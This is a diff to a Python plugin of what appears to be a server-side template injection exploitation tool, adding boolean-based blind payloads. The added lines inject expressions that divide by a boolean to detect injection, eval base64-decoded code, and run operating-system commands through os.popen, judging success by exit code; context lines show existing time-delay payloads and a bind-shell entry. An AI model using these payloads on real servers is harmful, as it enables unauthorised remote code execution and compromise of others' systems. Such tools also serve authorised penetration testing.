@@ -61,9 +61,20 @@ class Python(Plugin):
                 'test_bool_true': """'a'.join('ab') == 'aab'""",
                 'test_bool_false': 'True == False'
             },
+            'boolean': {
+                'call': 'inject',
+                'test_bool_true':  "1 / ('a'.join('bc') == 'bac')",
+                'test_bool_false': "1 / ('a'.join('bc') == 'abc')",
+                'verify_bool_true':  "1 / (bool('False') == True)",
+                'verify_bool_false': "1 / (bool('True') == False)"
+            },
             'evaluate_blind': {
                 'call': 'evaluate',
                 'evaluate_blind': """eval(__import__('base64').urlsafe_b64decode('{code_b64}').decode()) and __import__('time').sleep({delay})"""
+            },
+            'evaluate_boolean': {
+                'call': 'evaluate',
+                'evaluate_blind': """1 / bool(eval(__import__('base64').urlsafe_b64decode('{code_b64}').decode()))"""
             },
             'bind_shell': {
                 'call': 'execute_blind',
@@ -76,6 +87,11 @@ class Python(Plugin):
             'execute_blind': {
                 'call': 'evaluate',
                 'execute_blind': """__import__('os').popen(__import__('base64').urlsafe_b64decode('{code_b64}').decode() + ' && sleep {delay}').read()"""
+            },
+            'execute_boolean': {
+                'call': 'evaluate',
+                # TODO: payloads for python2 and python3 < 3.6
+                'execute_blind': """1 / (__import__('os').popen(__import__('base64').urlsafe_b64decode('{code_b64}').decode())._proc.wait() == 0)"""
             },
         })
 
